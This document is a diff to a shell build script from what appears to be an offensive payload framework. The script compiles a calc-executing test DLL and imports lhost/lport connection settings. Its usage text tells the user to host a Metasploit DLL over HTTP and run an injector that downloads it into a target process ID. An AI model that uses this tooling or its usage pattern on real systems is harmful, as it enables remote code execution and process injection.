@@ -21,6 +21,9 @@ cat banner.txt
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -36,9 +39,6 @@ set_command_exec no_command
 enable_debug_print
 #CONFIGURATION_END
 
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # compile exec_calc 32-bit dll payload from source
 $win32_compiler test_payloads/exec_calc.c -shared -o output/exec_calc.dll
@@ -72,13 +72,6 @@ cleanup_techniques
 echo "
 # Host the generated metasploit dll payload via HTTP on port 80
 # Call the injector executable like:
-# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
-# 'random' just fills argv[2], which is not needed here"
-
-
-#USAGE_START
-# Host the generated metasploit dll payload via HTTP on port 80
-# Call the injector executable like:
-# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
-# "random" just fills argv[2], which is not needed here
-#USAGE_END
+# $ injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
+# 'random' just fills argv[2], which is not needed here
+"
